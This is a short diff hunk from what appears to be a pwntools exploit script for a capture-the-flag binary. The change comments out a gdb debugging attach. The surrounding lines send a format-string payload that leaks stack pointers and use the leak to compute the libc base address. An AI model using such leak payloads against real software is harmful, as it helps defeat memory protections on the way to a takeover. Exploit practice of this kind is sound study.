@@ -43,7 +43,7 @@ pwndbg> stack 25
 17:005c│      0xffa0781c ◂— 0x0
 ... ↓
 '''
-gdb.attach(io, "b *do_fmt+64\nc")
+#  gdb.attach(io, "b *do_fmt+64\nc")
 io.send("..%8$p....%6$p..11111111\0")
 io.recvuntil("..")
 libc.address = int(io.recvuntil("..", drop = True), 16) - libc.sym['_IO_2_1_stdout_']
